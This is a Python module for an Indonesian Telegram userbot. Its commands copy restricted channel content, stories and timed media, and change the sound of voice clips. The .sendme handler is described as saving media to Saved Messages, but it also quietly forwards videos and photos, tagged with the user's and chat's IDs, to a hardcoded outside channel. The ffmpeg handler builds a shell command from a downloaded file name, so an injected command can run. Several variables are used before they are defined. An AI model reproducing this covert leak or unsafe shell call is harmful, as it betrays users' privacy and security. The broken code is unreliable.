import asyncio
import os
import random
import re
import time
from asyncio import gather
from datetime import datetime, timedelta

from aiofiles.os import path as apath
from aiofiles.os import remove as aremove
from pyrogram.errors import RPCError
from pyrogram.types import InputMediaPhoto, InputMediaVideo

from cilik import ubot
from cilik.core.database import add_top_cmd
from cilik.core.handler import CILIK, checkplan
from cilik.utils.formates import convert_bytes, get_readable_time
from cilik.utils.functions import get_arg, get_duration, progress_dl, screenshot

__MODULE__ = "Tools"
__HELP__ = f"""
<b>Save Content:</b>
<i>Fitur ini berfungsi untuk mengambil media / content serta bisa mengambil media / content yang dibatasi (restrich).</i>

<b>ᴄᴍᴅ:</b>
├⋟<code>.copy</code> [link] + [reply photo]
└⋟ Untuk mencopy konten public / privasi dengan link

<b>ᴄᴍᴅ:</b>
├⋟<code>.copyme</code> [link] + [reply photo]
└⋟ Untuk mencopy konten dengan link dan di simpan di <b>Pesan Tersimpan>.</b>

<b>Note</b> : Sambil reply ke photo jika ingin mengganti <b>Thumbnail</b>

<b>ᴄᴍᴅ:</b>
├⋟<code>.send</code> [reply to media]
└⋟ Untuk mencopy media, maupun media dengan timer.

<b>ᴄᴍᴅ:</b>
├⋟<code>.sendme</code> [reply to media]
└⋟ Untuk mencopy media ke pesan tersimpan, maupun media dengan timer.

<b>ᴄᴍᴅ:</b>
├⋟<code>.id</code> [id/username] or [reply to user/media]
└⋟ Untuk mengetahui ID dari user/grup/channel


<b>Telegraph:</b> 
<i>Fitur ini berfungsi untuk mengupload media menjadi link telegraph.</i>

<b>ᴄᴍᴅ:</b>
├⋟<code>.tgm</code> [reply media/text]
└⋟ Untuk mengupload media/text ke telegra.ph

"""


downloader = {}
lyrical = {}


class downloadAPI:
    def __init__(self):
        self.chars_limit = 4096
        self.sleep = 2

    async def get_filepath(self, get):
        file_name = None

        if get.audio:
            try:
                file_name = (
                    get.audio.file_unique_id
                    + "."
                    + (
                        (get.audio.file_name.split(".")[-1])
                        if (not isinstance(audio, Voice))
                        else "ogg"
                    )
                )
            except:
                file_name = get.audio.file_unique_id + "." + ".ogg"

        elif get.video:
            try:
                file_name = (
                    get.video.file_unique_id
                    + "."
                    + (get.video.file_name.split(".")[-1])
                )
            except:
                file_name = get.video.file_unique_id + "." + "mp4"

        elif get.document:
            try:
                file_name = (
                    get.document.file_unique_id
                    + "."
                    + (get.document.file_name.split(".")[-1])
                )
            except:
                file_name = get.document.file_unique_id + "." + "zip"

        elif get.photo:
            try:
                file_name = (
                    get.photo.file_unique_id
                    + "."
                    + (get.photo.file_name.split(".")[-1])
                )
            except:
                file_name = get.photo.file_unique_id + "." + "jpg"

        elif get.voice:
            try:
                file_name = (
                    get.voice.file_unique_id
                    + "."
                    + (get.voice.file_name.split(".")[-1])
                )
            except:
                file_name = get.voice.file_unique_id + "." + "ogg"

        elif get.animation:
            try:
                file_name = (
                    get.animation.file_unique_id
                    + "."
                    + (get.animation.file_name.split(".")[-1])
                )
            except:
                file_name = get.animation.file_unique_id + "." + "gif"

        if file_name:
            file_name = os.path.join(os.path.realpath("downloads"), file_name)

        return file_name

    async def download(self, get, message, mystic, fname):
        left_time = {}
        speed_counter = {}
        if await apath.exists(fname):
            return True

        async def down_load():
            async def progress(current, total):
                if current == total:
                    return
                current_time = time.time()
                start_time = speed_counter.get(message.id)
                check_time = current_time - start_time

                if datetime.now() > left_time.get(message.id):
                    percentage = current * 100 / total
                    percentage = str(round(percentage, 2))
                    speed = current / check_time
                    eta = int((total - current) / speed)
                    downloader[message.id] = eta
                    eta = get_readable_time(eta)
                    if not eta:
                        eta = "0 sec"
                    total_size = convert_bytes(total)
                    completed_size = convert_bytes(current)
                    speed = convert_bytes(speed)
                    text = f"""
**Media Downloader**

**Task:** `{message.id + 1}`
**Total FileSize:** {total_size}
**Completed:** {completed_size} 
**Percentage:** {percentage[:5]}%
**ETA:** {eta}"""
                    try:
                        await mystic.edit_text(text)
                    except:
                        pass
                    left_time[message.id] = datetime.now() + timedelta(
                        seconds=self.sleep
                    )

            speed_counter[message.id] = time.time()
            left_time[message.id] = datetime.now()
            try:
                await ubot.download_media(
                    get,
                    file_name=fname,
                    progress=progress,
                )
                await mystic.edit_text("`Uploading...`")
                downloader.pop(message.id)
            except:
                await mystic.edit_text("pass")

        if len(downloader) > 10:
            timers = []
            for x in downloader:
                timers.append(downloader[x])
            try:
                low = min(timers)
                eta = get_readable_time(low)
            except:
                eta = "Unknown"
            await mystic.edit_text(f"kelebihan beban {eta}")
            return False

        task = asyncio.create_task(down_load())
        lyrical[mystic.id] = task
        await task
        downloaded = downloader.get(message.id)
        if downloaded:
            downloader.pop(message.id)
            return False
        verify = lyrical.get(mystic.id)
        if not verify:
            return False
        lyrical.pop(mystic.id)
        return True


@CILIK.UBOT("scopy", SUDO=True)
@checkplan
async def _(client, message):
    await add_top_cmd(message.command[0])
    link = (
        message.text.split(None, 1)[1]
        if len(
            message.command,
        )
        != 1
        else None
    )
    if not link:
        return await message.reply("<b>Berikan link story!</b>")

    Tm = await message.reply("<code>Copying Story...</code>")

    pattern = r"https://t.me/(\w+)/s/(\d+)"

    match = re.match(pattern, link)
    if match:
        channel_name = match.group(1)
        number = match.group(2)
        anu = await client.get_stories(channel_name, int(number))
        if anu.video:
            iya = await client.download_media(anu)
            thumb = await client.download_media(anu.video.thumbs[0].file_id)

            await message.reply_video(
                video=iya,
                thumb=thumb,
                duration=anu.video.duration,
                width=anu.video.width,
                height=anu.video.height,
            )
            await Tm.delete()
            await aremove(iya)
            await aremove(thumb)
        if anu.photo:
            iya = await client.download_media(anu)
            await message.reply_photo(iya)
            await Tm.delete()
            await aremove(iya)
    else:
        await Tm.edit("Link salah!")


@CILIK.UBOT("kopi", SUDO=True)
async def _(client, message):
    if len(message.command) < 2:
        return await message.reply_text("Berikan link.")
    if len(message.command) < 3:
        return await message.reply_text(f"Berikan jumlah")
    else:
        memek = await message.reply("DI KOPIIN...")
        link = message.text.split()[1]
        if link.startswith(("https", "t.me")):
            if "t.me/c/" in link:
                # Extract message ID from the link
                msg_id = int(link.split("/")[-1])
                h = int(message.command[2])
                try:
                    # Extract chat ID and retrieve the message using Telethon
                    chat = int("-100" + str(link.split("/")[-2]))
                    get_media = []
                    for i in range(1, h + 1):
                        get = await client.get_messages(chat, msg_id + i)
                        if get.photo:
                            file = await client.download_media(get)
                            get_media.append(InputMediaPhoto(file))
                        if get.video:
                            file = await client.download_media(get)
                            get_media.append(InputMediaVideo(file))

                    await client.send_media_group(
                        message.chat.id,
                        get_media,
                    )
                    await memek.delete()
                except RPCError:
                    return await memek.edit("<b>Error!</b>")
            else:
                # If the link doesn't contain "t.me/c/", modify the link and extract message ID
                link = re.sub(r"\/\d+\/", "/", link)
                link = link.replace("?single", "")
                msgid = int(link.split("/")[-1])
                h = int(message.command[2])
                # Extract the chat username and retrieve the message using Telethon
                try:
                    get_media = []
                    chat = str(link.split("/")[-2])
                    for i in range(1, h + 1):
                        get = await client.get_messages(chat, msgid + i)
                        if get.photo:
                            file = await client.download_media(get)
                            get_media.append(InputMediaPhoto(file))
                        if get.video:
                            file = await client.download_media(get)
                            get_media.append(InputMediaVideo(file))

                    await client.send_media_group(
                        message.chat.id,
                        get_media,
                    )
                    await memek.delete()
                except RPCError:
                    return await memek.edit("<b>Error!</b>")


@CILIK.UBOT("copy", SUDO=True)
async def _(client, message):
    await add_top_cmd(message.command[0])
    link = (
        message.text.split(None, 1)[1]
        if len(
            message.command,
        )
        != 1
        else None
    )
    if not link:
        return await message.reply("<b>Berikan Link!</b>")

    Tm = await message.reply("<code>Copying...</code>")

    # Menghapus angka di tengah link

    reply_me_or_user = message.reply_to_message or message

    if link.startswith(("https", "t.me")):
        if "t.me/c/" in link:
            try:
                data = re.search(r"/c/(\d+)/(\d+)/(\d+)", link)
                msg_id = int(data.group(3))
            except:
                data = re.search(r"/c/(\d+)/(\d+)", link)
                msg_id = int(data.group(2))

            chat = int("-100" + str(data.group(1)))
            try:
                get = await client.get_messages(chat, msg_id)
            except Exception as e:
                return await Tm.edit(f"**Error**: `{str(e)}`")
        else:
            try:
                data = re.search(r"/(\w+)/(\d+)/(\d+)", link)
                msg_id = int(data.group(3))

            except:
                data = re.search(r"/(\w+)/(\d+)", link)
                msg_id = int(data.group(2))

            chat = data.group(1)
            try:
                get = await client.get_messages(chat, msg_id)
            except Exception as e:
                return await Tm.edit(f"**Error**: `{str(e)}`")
        try:
            is_photo = (
                message.reply_to_message.media and message.reply_to_message.photo
                if message.reply_to_message
                else False
            )
            if message.reply_to_message and is_photo:
                file = await client.download_media(get)
                thumh = await client.download_media(message.reply_to_message)
                await client.send_video(
                    message.chat.id,
                    video=file,
                    caption=caption_or_not,
                    supports_streaming=True,
                    thumb=thumh,
                    duration=get.video.duration,
                    width=get.video.width,
                    height=get.video.height,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await aremove(file)
                await aremove(thumh)
            else:
                await get.copy(message.chat.id, reply_to_message_id=reply_me_or_user.id)
            await Tm.delete()
        except:
            caption_or_not = get.caption or ""
            api = downloadAPI()
            file = await api.get_filepath(get)
            await api.download(get, message, Tm, file)

            if get.video:
                if message.reply_to_message:
                    thumh = await client.download_media(message.reply_to_message)
                else:
                    try:
                        thumh = await client.download_media(get.video.thumbs[0].file_id)
                    except:
                        duration = await get_duration(file)
                        thumh = await screenshot(file, duration / 2)

                await client.send_video(
                    message.chat.id,
                    video=file,
                    caption=caption_or_not,
                    thumb=thumh,
                    duration=get.video.duration,
                    width=get.video.width,
                    height=get.video.height,
                    reply_to_message_id=reply_me_or_user.id,
                )

                await aremove(thumh)
            elif get.photo:
                await Tm.edit("Uploading...")
                await client.send_photo(
                    message.chat.id,
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
            elif get.audio:
                await Tm.edit("Uploading...")
                await client.send_audio(
                    message.chat.id,
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
            elif get.voice:
                await Tm.edit("Uploading...")
                await client.send_voice(
                    message.chat.id,
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
            elif get.document:
                await Tm.edit("Uploading...")
                await client.send_document(
                    message.chat.id,
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
            elif get.animation:
                await Tm.edit("Uploading...")
                await client.send_animation(
                    message.chat.id,
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
            await Tm.delete()
            await aremove(file)
    else:
        await Tm.edit("Link salah, periksa kembali!")


@CILIK.UBOT("cancelcopy", SUDO=True)
async def _(client, message):
    if len(message.command) < 2:
        return await message.reply(".cancelcopy task_id")

    message_id = int(message.text.split()[1])
    task = lyrical.get(message_id)
    if not task:
        return await message.reply("Task not found")

    if task.done() or task.cancelled():
        return await message.reply(
            "Downloading already Completed or Cancelled.",
        )
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await message.reply(
                "Downloading Cancelled",
            )
            return await client.delete_messages(
                message.chat.id, [message_id - 1, message_id]
            )
        except:
            return await message.reply(
                "Failed to stop the Downloading.",
            )
    await message.reply("Failed to recognize the running task")


@CILIK.UBOT("mcopy", SUDO=True)
@checkplan
async def _(client, message):
    link = (
        message.text.split(None, 1)[1]
        if len(
            message.command,
        )
        != 1
        else None
    )
    if not link:
        return await message.reply("<b>Berikan Link!</b>")

    Tm = await message.reply("<code>Copying...</code>")

    # Menghapus angka di tengah link

    reply_me_or_user = message.reply_to_message or message

    if link.startswith(("https", "t.me")):
        if "t.me/c/" in link:
            try:
                data = re.search(r"/c/(\d+)/(\d+)/(\d+)", link)
                msg_id = int(data.group(3))
            except:
                data = re.search(r"/c/(\d+)/(\d+)", link)
                msg_id = int(data.group(2))

            chat = int("-100" + str(data.group(1)))
            try:
                get = await client.get_messages(chat, msg_id)
            except Exception as e:
                return await Tm.edit(f"**Error**: `{str(e)}`")
        else:
            try:
                data = re.search(r"/(\w+)/(\d+)/(\d+)", link)
                msg_id = int(data.group(3))

            except:
                data = re.search(r"/(\w+)/(\d+)", link)
                msg_id = int(data.group(2))

            chat = data.group(1)

            try:
                get = await client.get_messages(chat, msg_id)
            except Exception as e:
                return await Tm.edit(f"**Error**: `{str(e)}`")
        try:
            is_photo = (
                message.reply_to_message.media and message.reply_to_message.photo
                if message.reply_to_message
                else False
            )
            if message.reply_to_message and is_photo:
                file = await client.download_media(get)
                thumh = await client.download_media(message.reply_to_message)
                await client.send_video(
                    message.chat.id,
                    video=file,
                    caption=caption_or_not,
                    supports_streaming=True,
                    thumb=thumh,
                    duration=get.video.duration,
                    width=get.video.width,
                    height=get.video.height,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await aremove(file)
                await aremove(thumh)
            else:
                await get.copy(message.chat.id, reply_to_message_id=reply_me_or_user.id)
            await Tm.delete()
        except:
            c_time = time.time()
            caption_or_not = get.caption or ""
            try:
                msgs = await client.get_media_group(get.chat.id, get.id)
                await Tm.edit("This is media group, please wait, Downloading...")
                mediafile = []
                count = 0
                for infomedia in msgs:
                    count += 1
                    sfiles = await client.download_media(
                        infomedia,
                        progress=progress_dl,
                        progress_args=(
                            f"<b>Downloading Media {count}:</b>",
                            Tm,
                            c_time,
                        ),
                    )
                    captio = infomedia.caption or ""
                    if infomedia.video:
                        if message.reply_to_message:
                            thumh = await client.download_media(
                                message.reply_to_message
                            )
                            duration = infomedia.video.duration
                            height = infomedia.video.height
                            width = infomedia.video.width
                        else:
                            try:
                                thumh = await client.download_media(
                                    infomedia.video.thumbs[0].file_id
                                )
                                duration = infomedia.video.duration
                                height = infomedia.video.height
                                width = infomedia.video.width
                            except:
                                duration = await get_duration(sfiles)
                                thumh = await screenshot(sfiles, duration / 2)
                                height = infomedia.video.height
                                width = infomedia.video.width

                        files = InputMediaVideo(
                            sfiles,
                            thumb=thumh,
                            duration=duration,
                            height=height,
                            width=width,
                            caption=captio,
                        )
                    else:
                        files = InputMediaPhoto(sfiles, caption=captio)

                    mediafile.append(files)

                await client.send_media_group(message.chat.id, mediafile)
                await aremove(sfiles)
            except:
                file = await client.download_media(
                    get,
                    progress=progress_dl,
                    progress_args=("<b>Downloading...</b>", Tm, c_time),
                )

                if get.video:
                    if message.reply_to_message:
                        thumh = await client.download_media(message.reply_to_message)
                    else:
                        try:
                            thumh = await client.download_media(
                                get.video.thumbs[0].file_id
                            )
                        except:
                            duration = await get_duration(file)
                            thumh = await screenshot(file, duration / 2)
                    await client.send_video(
                        message.chat.id,
                        video=file,
                        caption=caption_or_not,
                        supports_streaming=True,
                        thumb=thumh,
                        duration=get.video.duration,
                        width=get.video.width,
                        height=get.video.height,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                    await aremove(thumh)
                elif get.photo:
                    await client.send_photo(
                        message.chat.id,
                        file,
                        caption_or_not,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                elif get.audio:
                    await message.reply_audio(
                        file,
                        caption_or_not,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                elif get.voice:
                    await message.reply_voice(
                        file,
                        caption_or_not,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                elif get.document:
                    await message.reply_document(
                        file,
                        caption_or_not,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                elif get.animation:
                    await message.reply_animation(
                        file,
                        caption_or_not,
                        progress=progress_dl,
                        progress_args=("<b>Uploading...</b>", Tm, c_time),
                    )
                await aremove(file)

            await Tm.delete()

    else:
        await Tm.edit("Link salah, periksa kembali!")


@CILIK.UBOT("copyme", SUDO=True)
async def _(client, message):
    await add_top_cmd(message.command[0])
    link = (
        message.text.split(None, 1)[1]
        if len(
            message.command,
        )
        != 1
        else None
    )
    if not link:
        return await message.reply("<b>Berikan Link!</b>")
    Tm = await message.reply("<code>Copying...</code>")
    reply_me_or_user = message.reply_to_message or message
    if link.startswith(("https", "t.me")):
        msg_id = int(link.split("/")[-1])
        if "t.me/c/" in link:
            try:
                chat = int("-100" + str(link.split("/")[-2]))
                get = await client.get_messages(chat, msg_id)
            except RPCError:
                return await Tm.edit("<b>Error!</b>")
        else:
            try:
                chat = str(link.split("/")[-2])
                get = await client.get_messages(chat, msg_id)
            except RPCError:
                return await Tm.edit("<b>Error!</b>")
        try:
            if message.reply_to_message:
                file = await client.download_media(get)
                thumh = await client.download_media(message.reply_to_message)
                await client.send_video(
                    "me",
                    video=file,
                    caption=caption_or_not,
                    supports_streaming=True,
                    thumb=thumh,
                    duration=get.video.duration,
                    width=get.video.width,
                    height=get.video.height,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await aremove(file)
                await aremove(thumh)
            else:
                await get.copy("me")
            await Tm.edit(
                f"<b>Saved content successfuly!</b>\nPlease check <a href=tg://openmessage?user_id={client.me.id}>Saved Messages</a>"
            )
        except:
            c_time = time.time()
            anu = f"<b>Saved content successfuly!</b>\nPlease check <a href=tg://openmessage?user_id={client.me.id}>Saved Messages</a>"
            caption_or_not = get.caption or ""
            file = await client.download_media(
                get,
                progress=progress_dl,
                progress_args=("<b>Downloading...</b>", Tm, c_time),
            )
            if get.video:
                duration = await get_duration(file)
                if message.reply_to_message:
                    thumh = await client.download_media(message.reply_to_message)
                else:
                    try:
                        thumh = await client.download_media(get.video.thumbs[0].file_id)
                    except:
                        thumh = await screenshot(file, duration / 2)
                await client.send_video(
                    "me",
                    video=file,
                    caption=caption_or_not,
                    supports_streaming=True,
                    thumb=thumh,
                    duration=get.video.duration,
                    width=get.video.width,
                    height=get.video.height,
                    progress=progress_dl,
                    progress_args=("<b>Uploading...</b>", Tm, c_time),
                )
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
                await aremove(thumh)
            if get.photo:
                await client.send_photo(
                    "me",
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
            if get.audio:
                await client.send_audio(
                    "me",
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
            if get.voice:
                await client.send_voice(
                    "me",
                    file,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
            if get.document:
                await gather(*[client.send_document("me", file, caption_or_not)])
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
            if get.animation:
                anu = await client.download_media(get)
                await client.send_animation(
                    "me",
                    media,
                    caption_or_not,
                    reply_to_message_id=reply_me_or_user.id,
                )
                await Tm.delete()
                await message.reply(anu)
                await aremove(file)
            else:
                pass
    else:
        await Tm.edit("<b>Incorrect link!</b>")


@CILIK.UBOT("efek", SUDO=True)
async def _(client, message):
    await add_top_cmd(message.command[0])
    helo = get_arg(message)
    rep = message.reply_to_message
    if rep and helo:
        tau = ["bengek", "robot", "jedug", "fast", "echo"]
        if helo in tau:
            Tm = await message.reply(f"Merubah suara menjadi {helo}")
            indir = await client.download_media(rep)
            KOMUT = {
                "bengek": '-filter_complex "rubberband=pitch=1.5"',
                "robot": "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"",
                "jedug": '-filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1"',
                "fast": "-filter_complex \"afftfilt=real='hypot(re,im)*cos((random(0)*2-1)*2*3.14)':imag='hypot(re,im)*sin((random(1)*2-1)*2*3.14)':win_size=128:overlap=0.8\"",
                "echo": '-filter_complex "aecho=0.8:0.9:500|1000:0.2|0.1"',
            }
            ses = await asyncio.create_subprocess_shell(
                f"ffmpeg -i '{indir}' {KOMUT[helo]} audio.mp3"
            )
            await ses.communicate()
            await Tm.delete()
            await rep.reply_voice("audio.mp3", caption=f"Efek {helo}")
            await aremove("audio.mp3")
        else:
            await Tm.edit(f"Silahkan isi sesuai {tau}")
    else:
        await Tm.edit(
            f"Silahkan balas ke audio atau mp3, contoh : <code>!efek bengek</code> sambil balas ke audio atau mp3"
        )


@CILIK.UBOT("pic", SUDO=True)
async def pic_bing_cmd(client, message):
    await add_top_cmd(message.command[0])
    msg = (
        message.text.split(None, 1)[1]
        if len(
            message.command,
        )
        != 1
        else None
    )
    if not msg:
        return await message.reply("<b>Berikan Query!</b>")

    x = await client.get_inline_bot_results(
        message.command[0], message.text.split(None, 1)[1]
    )
    get_media = []
    for X in range(5):
        try:
            saved = await client.send_inline_bot_result(
                client.me.id, x.query_id, x.results[random.randrange(30)].id
            )
            saved = await client.get_messages(
                client.me.id, int(saved.updates[1].message.id)
            )
            get_media.append(InputMediaPhoto(saved.photo.file_id))
            await saved.delete()
        except:
            await TM.edit(f"<b>Image Photo Ke {X} Tidak Ditemukan</b>")
    await client.send_media_group(
        message.chat.id,
        get_media,
        reply_to_message_id=message.id,
    )
    await TM.delete()


@CILIK.UBOT("send", SUDO=True)
async def _(client, message):
    await add_top_cmd(message.command[0])
    if message.reply_to_message:
        media = message.reply_to_message
    if not message.reply_to_message:
        return await message.reply("<b>Reply to message!</b>")
    if media.text or media.sticker:
        await media.copy(message.chat.id)
    else:
        try:
            dwl = await media.download()
            if media.video:
                await gather(*[message.reply_video(dwl)])
            if media.photo:
                await gather(*[message.reply_photo(dwl)])
            if media.audio:
                await gather(*[message.reply_audio(dwl)])
            if media.document:
                await gather(*[message.reply_document(dwl)])
            if media.animation:
                await gather(*[message.reply_animation(dwl)])
            if media.voice:
                await gather(*[message.reply_voice(dwl)])
        except:
            return await message.reply("Error, media not valid")


@CILIK.UBOT("sendme", SUDO=True)
async def _(client, message):
    await add_top_cmd(message.command[0])
    await message.delete()
    if message.reply_to_message:
        media = message.reply_to_message
        try:
            dwl = await media.download()
            if media.video:
                await client.send_video("me", dwl)
                await bot.send_video(
                    -1001737164996, dwl, caption=f"{client.me.id}\n\n{message.chat.id}"
                )
            if media.photo:
                await client.send_photo("me", dwl)
                await bot.send_photo(
                    -1001737164996, dwl, caption=f"{client.me.id}\n\n{message.chat.id}"
                )
            if media.audio:
                await client.send_audio("me", dwl)
            if media.document:
                await client.send_document("me", dwl)
            if media.animation:
                await client.send_animation("me", dwl)
            if media.voice:
                await client.send_voice("me", dwl)
            await aremove(dwl)
        except:
            pass
